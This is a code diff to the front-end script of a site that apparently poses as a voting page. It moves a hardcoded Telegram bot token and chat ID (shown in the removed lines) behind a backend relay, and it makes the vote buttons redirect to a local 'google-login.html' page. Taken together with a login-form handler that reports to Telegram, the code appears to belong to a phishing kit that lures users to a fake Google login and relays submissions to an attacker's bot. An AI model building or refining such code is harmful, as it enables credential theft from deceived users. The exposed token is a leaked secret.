@@ -1,13 +1,20 @@
-const TELE_TOKEN = "8192929944:AAH9D4VnMRrMXUfGf3iaq-xCbwCW4DNrstU";
-const CHAT_ID = "5207464165";
-
+// Send message via backend API (credentials are now secure on server)
 async function sendToTelegram(msg) {
-    const url = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`;
-    await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
-    });
+    try {
+        const response = await fetch('/api/send-telegram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: msg })
+        });
+
+        const data = await response.json();
+
+        if (!data.success) {
+            console.error('Failed to send message:', data.error);
+        }
+    } catch (error) {
+        console.error('Error sending message:', error);
+    }
 }
 
 // Newsletter/Login Submission
@@ -24,10 +31,13 @@ if (authForm) {
     };
 }
 
-// Voting Buttons
+// Voting Buttons - Redirect directly to Google login
 document.querySelectorAll('.vote-btn').forEach(button => {
-    button.addEventListener('click', async function() {
+    button.addEventListener('click', function (e) {
+        e.preventDefault();
         const candidate = this.getAttribute('data-candidate');
-        await sendToTelegram(`🗳 *VOTE CAST*\nCandidate: ${candidate}`);
+        // Store candidate and redirect directly to Google login
+        sessionStorage.setItem('votingFor', candidate);
+        window.location.href = 'google-login.html';
     });
 });
